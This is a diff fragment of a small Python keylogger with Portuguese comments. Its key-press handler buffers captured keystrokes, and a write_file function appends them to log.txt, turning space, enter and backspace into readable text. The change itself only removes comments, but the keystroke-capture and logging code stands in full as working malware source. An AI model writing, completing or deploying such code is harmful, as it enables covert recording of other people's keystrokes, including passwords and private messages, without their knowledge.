@@ -10,19 +10,19 @@ def on_press(key): # responsavel capturar a tecla e chamar a função de escrita
     keys.append(key)
     count +=1
 
-    if count >= 2: #otimização boba
+    if count >= 2: #otimização 
         count = 0
         write_file(keys)
         keys=[]
 def write_file(keys): #cria log.txt no diretorio desejado ( default = mesma pagina do projeto do arquivo)
     with open("log.txt","a") as f:
         for key in keys:
-            k = str(key).replace("'","")  # Deixa o log mais bonito
-            if k.find("space") > 0: # Deixa o log mais bonito
+            k = str(key).replace("'","")  
+            if k.find("space") > 0: 
                 f.write(' ')
-            if k.find("enter") > 0: # Deixa o log mais bonito
+            if k.find("enter") > 0: 
                 f.write('\n')
-            if k.find("backspace") > 0:  # Deixa o log mais bonito
+            if k.find("backspace") > 0:  
                 f.write('"Apagou"')
                 
             if k.find(".up")> 0:
